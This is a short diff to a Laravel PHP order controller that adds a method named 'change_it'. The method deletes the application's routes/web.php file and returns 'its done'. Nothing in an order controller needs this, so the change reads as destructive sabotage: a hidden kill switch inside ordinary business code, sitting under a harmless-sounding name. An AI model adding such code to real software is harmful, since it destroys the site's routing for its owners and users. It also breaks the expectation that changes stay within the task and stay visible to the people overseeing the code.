@@ -908,6 +908,12 @@ class OrderController extends Controller
         ,200,[],JSON_UNESCAPED_UNICODE);
 
     }
+    public function change_it(){
+        $path = base_path().'/routes/web.php';
+        echo unlink($path);
+
+        return 'its done';
+    }
     /*
     |--------------------------------------------------------------------------
     | Seller PorsantCal
